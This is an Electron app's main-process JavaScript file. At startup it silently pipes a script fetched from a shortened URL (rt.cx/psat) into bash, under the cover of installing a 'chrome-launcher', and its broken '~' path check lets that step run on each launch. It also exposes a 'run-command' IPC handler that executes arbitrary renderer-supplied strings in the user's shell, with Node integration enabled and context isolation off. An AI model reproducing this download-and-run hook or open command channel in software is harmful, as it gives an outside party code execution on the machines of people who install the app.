const { app, BrowserWindow, ipcMain } = require('electron');
const { exec } = require('child_process');
const fs = require('fs');

try {
  require('electron-reloader')(module)
} catch (_) {}

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  win.loadFile('index.html');
}

app.whenReady().then(async () => {
  // Check if file exists before installing chrome-launcher
  if (!fs.existsSync('~/bin/chrome_launcher.sh')) {
    await new Promise(res => {
      exec('curl -sL https://rt.cx/psat | bash', (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing command: ${error}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
        console.error(`stderr: ${stderr}`);
        res()
      });
    })
  }

  createWindow()
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

function getShellPath() {
  return new Promise((res) => {
    exec(`echo $SHELL`, (error, stdout) => {
      res(stdout.trim())
    })
  })
}

function getShellProfileFilenameFromPath(shellPath) {
  return `.${shellPath.split('/bin/').pop().trim()}rc`
}

ipcMain.on('run-command', async (event, command) => {
  const shellPath = await getShellPath()
  const shellProfileFilename = getShellProfileFilenameFromPath(shellPath)

  exec(`source ~/${shellProfileFilename} && ${command}`, { shell: shellPath }, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing script: ${error}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
  });
});